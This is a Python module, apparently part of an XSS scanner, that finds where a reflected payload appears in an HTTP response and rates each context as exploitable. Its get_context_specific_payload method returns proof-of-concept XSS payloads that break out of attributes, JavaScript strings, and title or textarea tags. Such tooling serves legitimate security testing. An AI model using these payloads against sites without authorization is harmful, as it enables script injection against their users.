#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Context Analyzer
Analyzes where payload is reflected in response
"""

import re
from typing import Dict

class ContextAnalyzer:
    """Analyze XSS payload context in response"""
    
    CONTEXTS = {
        'html_content': {
            'pattern': r'<body[^>]*>.*{payload}.*</body>',
            'description': 'Inside HTML body content',
            'exploitable': True
        },
        'html_attribute': {
            'pattern': r'<[^>]+=["\'][^"\']*{payload}[^"\']*["\'][^>]*>',
            'description': 'Inside HTML attribute value',
            'exploitable': True
        },
        'script_tag': {
            'pattern': r'<script[^>]*>.*{payload}.*</script>',
            'description': 'Inside script tag',
            'exploitable': True
        },
        'javascript_string': {
            'pattern': r'["\'][^"\']*{payload}[^"\']*["\']',
            'description': 'Inside JavaScript string',
            'exploitable': True
        },
        'javascript_code': {
            'pattern': r'(?:var|let|const)\s+\w+\s*=.*{payload}',
            'description': 'Inside JavaScript code',
            'exploitable': True
        },
        'style_tag': {
            'pattern': r'<style[^>]*>.*{payload}.*</style>',
            'description': 'Inside style tag',
            'exploitable': True
        },
        'css_property': {
            'pattern': r'[a-z-]+\s*:\s*[^;]*{payload}[^;]*;',
            'description': 'Inside CSS property',
            'exploitable': True
        },
        'comment': {
            'pattern': r'<!--.*{payload}.*-->',
            'description': 'Inside HTML comment',
            'exploitable': False
        },
        'textarea': {
            'pattern': r'<textarea[^>]*>.*{payload}.*</textarea>',
            'description': 'Inside textarea',
            'exploitable': False
        },
        'title': {
            'pattern': r'<title>.*{payload}.*</title>',
            'description': 'Inside title tag',
            'exploitable': True
        },
        'iframe_srcdoc': {
            'pattern': r'<iframe[^>]*srcdoc=["\'][^"\']*{payload}[^"\']*["\'][^>]*>',
            'description': 'Inside iframe srcdoc',
            'exploitable': True
        },
        'noscript': {
            'pattern': r'<noscript>.*{payload}.*</noscript>',
            'description': 'Inside noscript tag',
            'exploitable': False
        },
        'template': {
            'pattern': r'<template[^>]*>.*{payload}.*</template>',
            'description': 'Inside template tag',
            'exploitable': False
        },
    }
    
    def analyze(self, response: str, encoded_payload: str, original_payload: str) -> str:
        """Analyze the context of payload reflection"""
        
        # Check each context
        for context_name, context_info in self.CONTEXTS.items():
            pattern = context_info['pattern'].format(payload=re.escape(encoded_payload))
            if re.search(pattern, response, re.IGNORECASE | re.DOTALL):
                return f"{context_info['description']} ({'Exploitable' if context_info['exploitable'] else 'Not directly exploitable'})"
        
        # Check if in URL
        if encoded_payload in response and 'href=' in response:
            return "Inside URL/href attribute (check for javascript: protocol)"
        
        # Check if reflected at all
        if encoded_payload not in response and original_payload not in response:
            return "Not reflected in response"
        
        return "Unknown context (reflected but location unclear)"
    
    def get_context_specific_payload(self, context: str, base_payload: str) -> str:
        """Get payload tailored for specific context"""
        
        if 'HTML attribute' in context:
            return f'" onmouseover="alert(1)" x="'
        elif 'JavaScript string' in context:
            return "';alert(1);//"
        elif 'JavaScript code' in context:
            return "alert(1)"
        elif 'style' in context.lower():
            return "expression(alert(1))"
        elif 'title' in context.lower():
            return "</title><script>alert(1)</script>"
        elif 'textarea' in context.lower():
            return "</textarea><script>alert(1)</script>"
        
        return base_payload
